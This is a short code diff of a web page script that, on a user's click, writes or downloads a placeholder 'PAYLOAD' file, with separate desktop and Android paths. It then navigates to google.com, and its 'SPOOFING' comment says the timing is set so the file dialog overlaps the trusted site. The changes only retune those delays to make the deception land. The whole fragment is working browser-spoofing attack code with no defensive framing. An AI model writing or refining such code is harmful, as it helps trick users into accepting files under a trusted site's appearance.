@@ -20,7 +20,7 @@ document.addEventListener('click', async () => {
                 await w.write('PAYLOAD');
                 await w.close();
             } catch(e) {}
-        }, 800);
+        }, 1000);
         
     } else {
         // === ANDROID PATH ===
@@ -32,13 +32,13 @@ document.addEventListener('click', async () => {
             });
             document.body.appendChild(a);
             a.click();
-        }, 800);
+        }, 1000);
     }
     
     // === SPOOFING: Navigate ke trusted site ===
     setTimeout(() => {
         window.location.href = 'https://google.com';
-    }, 1000);  // Sedikit delay dari dialog agar overlap terjadi
+    }, 500);  // Sedikit delay dari dialog agar overlap terjadi
 });
 </script>
 </body>
